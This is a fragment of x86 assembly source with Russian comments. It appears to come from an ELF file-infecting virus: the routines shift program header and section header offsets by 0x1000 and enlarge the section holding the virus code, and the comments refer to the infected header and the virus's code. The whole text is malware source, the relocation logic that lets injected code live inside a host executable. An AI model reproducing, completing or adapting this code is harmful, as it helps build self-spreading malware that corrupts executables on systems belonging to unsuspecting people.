;======фикс программного заголовка
applyph

mov ebx, [e_phoff]
add ebx,eax;указатель на первый хедер
add ebx,4;на поле p_offset

mov cx, [e_phnum];кол-во хедеров

gogogo1
cmp [ebx],edx
jl nolong1;если хедер после зараженного
%ifdef DEBUGVER
errors "Segment fixed   ",segfix,segfix1
%endif

add dword [ebx],1000h;то пофиксить его p_offset
nolong1
add ebx,20h;проверять следующий хедер
dec cx
jnz gogogo1

ret
;=====================================

;=======фикс заголовков секций==принцип как и в программ хедер
applysh
push esi

mov ebx, [e_shoff]
add ebx,1010h
add ebx,eax

mov cx, [e_shunum]

gogogo
cmp [ebx],edx
jl nolong
%ifdef DEBUGVER
errors "Sector fixed   ",secfix,secfix1
%endif
add dword [ebx],1000h
nolong

mov esi,[ebx]
add esi,[ebx+4h]
sub esi,edx
jnz othersec
%ifdef DEBUGVER
errors "Sector found  ",secfou,secfou1
%endif
add dword [ebx+4h],1000h;если нашли тот, в котором код виря, то увеличим его
othersec

add ebx,28h
dec cx
jnz gogogo

pop esi
ret
;==============================================================================